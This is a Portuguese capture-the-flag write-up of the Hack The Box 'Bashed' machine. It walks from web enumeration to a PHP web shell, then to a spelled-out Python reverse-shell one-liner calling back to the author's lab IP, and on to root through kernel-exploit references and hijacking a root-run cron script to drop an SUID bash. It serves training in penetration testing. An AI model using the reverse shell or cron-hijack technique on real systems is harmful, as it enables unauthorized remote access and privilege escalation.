---
title:     "Hack The Box - Bashed"
tags: [linux,easy, CVE 2017-6074, CVE 2017-16995, kernel exploit]
categories: Linux
---

![1.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-bashed/1.jpg)

## Enumeration

Iniciamos a enumeracao, usando o autorecon para ganhar tempo...

![2.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-bashed/2.jpg)

Em paralelo eu estava olhando o site manualmente, de inicio vc ja encontra algumas dicas sobre a maquina..

Apos isso, fui verificar o output do autorecon e encotrei algumas coisas interessantes

![3.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-bashed/3.jpg)

Veja o code de cada dir encontrado, os de `code 308` sao os mais imnportantes, entao precisava verificar cada um deles, ao verificar o `/dev` encontro o que eu estava procurando.. o `phpbash.php` entao ali eu ja tinha um bash em php, eu precisava agora ter uma reverse shell.

## Reverse Shell

Usando a tool [gorevpop](https://github.com/an4kein/gorevpop) que eu criei recentemente usando Go, gerei um payload python3 e em seguida ja estava com uma reverse shell

```
root@kali:~/HTB-Linux/bashed# go run /opt/gorevpop/main.go 19 10.10.14.25 443                                        

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.25",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'
```

![4.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-bashed/4.jpg)

![5.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-bashed/5.jpg)

## Privilege Escalation

### With CVE: 2017-6074

`Linux Kernel 4.4.0 (Ubuntu) - DCCP Double-Free Privilege Escalation`

***reference*** https://www.exploit-db.com/exploits/41458

![6.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-bashed/6.jpg)

### With CVE: 2017-16995

`
Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation`


***reference*** https://www.exploit-db.com/exploits/44298

![7.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-bashed/7.jpg)

### Process

Analisando um pouco mais, o usuario `scriptmanager` nao precisa de password para executar, usando o `sudo`

`(scriptmanager : scriptmanager) NOPASSWD: ALL`

![8.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-bashed/8.jpg)

Depois de trocar de usuario comm o seguinte comando `sudo -u scriptmanager /bin/bash`

antes de obter root usando kernel exploit estava analisando os processos, para identificar algo sendo executado pelo o root.. usei o [pspy](https://github.com/DominicBreuker/pspy)

![9.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-bashed/9.jpg)


Veja que em minuto em minuto  o `root` abre o `/scripts` em seguida executa o test.py. Entao, eu criei o  meu proprio `test.py` e troquei pelo o existente.

![10.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-bashed/10.jpg)

Feito, isso. eh so aguardar um minuto e nosso `rootbash` sera criado com o `suid` de root no `\tmp`

antes: 

![11.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-bashed/11.jpg)

depois:

![12.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-bashed/12.jpg)

Agora, basta ir ate o `\tmp` da permissao de execucao ao `rootbash`  `chmod +x rootbash` em seguida executar `rootbash -p` e teremos nossa shell de root

![13.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-bashed/13.jpg)









